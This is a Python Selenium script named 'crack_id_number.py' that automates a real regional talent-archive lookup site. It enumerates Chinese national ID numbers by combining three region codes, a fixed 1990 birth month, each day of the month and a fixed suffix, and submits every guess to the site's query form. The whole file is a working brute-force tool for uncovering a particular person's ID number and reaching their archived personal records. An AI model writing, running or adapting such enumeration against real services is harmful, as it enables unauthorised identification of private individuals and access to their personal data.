#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
@Time     : 2020/6/16 17:09
@Author   : Johnny
@Email    : yaoqiang@gjzq.com.cn
@File     : crack_id_number.py
@Software : PyCharm Community
"""
import time

from poium import Page, PageElement
from selenium import webdriver

# city_id = ["620103","620104","620111","620121","620122","620123","620102","620105"]
city_id = ["330522","330521","330523"]

dat = ["01","02","03","04","05","06","07","08","09","10","11","12","13","14","15","16","17","18",
       "19","20","21","22","23","24","25","26","27","28","29","30","31"]

class LoginPage(Page):
    type = PageElement(name='type')
    id_type = PageElement(xpath='//*[@id="selType"]/option[2]')
    id_num = PageElement(id_='txtName')
    query = PageElement(xpath='//*[@id="form2"]/input[3]')

driver = webdriver.Chrome()
page = LoginPage(driver)
page.get("http://www.hzhr.com/Web/Agent/Archives.html%EF%BC%88%E6%B9%96%E5%B7%9E%E4%BA%BA%E6%89%8D%E7%BD%91%EF%BC%89")
page.type.click()
page.id_type.click()

for cityId in city_id:
    for dat_time in dat:
        id_str = cityId + "199002" + dat_time + "3066"
        page.id_num.clear()
        page.id_num.send_keys(id_str)
        page.query.click()
        time.sleep(2)








